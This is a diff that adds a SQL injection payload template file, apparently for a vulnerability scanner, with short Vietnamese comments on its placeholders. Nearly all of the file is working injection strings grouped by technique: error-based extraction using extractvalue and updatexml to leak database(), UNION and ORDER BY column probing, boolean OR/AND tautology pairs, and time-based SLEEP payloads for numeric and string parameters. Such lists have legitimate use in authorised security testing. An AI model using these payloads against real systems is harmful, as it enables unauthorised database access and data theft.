@@ -1,4 +1,64 @@
-'
-"
-')
-")
+# SQLi payload templates.
+# Bien co the dung:
+# - {sample}: gia tri mau cua param trong inventory
+# - {sleep}: so giay sleep trong config
+#
+# Scanner se chon numeric cho int/float, string cho cac param con lai.
+
+[error.numeric]
+{sample}'
+{sample}"
+{sample})
+{sample} AND extractvalue(1,concat(0x7e,database()))
+{sample} AND updatexml(1,concat(0x7e,database()),1)
+{sample} ORDER BY 999
+{sample} UNION SELECT NULL
+{sample} UNION SELECT NULL,NULL,NULL,NULL,NULL
+
+[error.string]
+{sample}'
+{sample}"
+{sample}')
+{sample}")
+{sample}' AND extractvalue(1,concat(0x7e,database()))-- -
+{sample}' AND updatexml(1,concat(0x7e,database()),1)-- -
+{sample}" AND extractvalue(1,concat(0x7e,database()))-- -
+{sample}' ORDER BY 999-- -
+{sample}' UNION SELECT NULL-- -
+{sample}' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -
+
+[boolean.numeric.true]
+{sample} AND 1=1
+{sample} OR 1=1
+{sample} AND 2>1
+{sample} AND EXISTS(SELECT 1)
+
+[boolean.numeric.false]
+{sample} AND 1=2
+{sample} AND 2<1
+{sample} AND 1=0
+{sample} AND EXISTS(SELECT 1 FROM users WHERE 1=2)
+
+[boolean.string.true]
+{sample}' AND '1'='1'-- -
+{sample}' OR '1'='1'-- -
+{sample}') AND ('1'='1'-- -
+{sample}" AND "1"="1"-- -
+
+[boolean.string.false]
+{sample}' AND '1'='2'-- -
+{sample}' AND '2'='1'-- -
+{sample}') AND ('1'='2'-- -
+{sample}" AND "1"="2"-- -
+
+[time.numeric]
+{sample} AND SLEEP({sleep})
+{sample} OR SLEEP({sleep})
+{sample} AND IF(1=1,SLEEP({sleep}),0)
+{sample}' AND SLEEP({sleep})-- -
+
+[time.string]
+{sample}' AND SLEEP({sleep})-- -
+{sample}' OR SLEEP({sleep})-- -
+{sample}' AND IF(1=1,SLEEP({sleep}),0)-- -
+{sample}") OR SLEEP({sleep})-- -
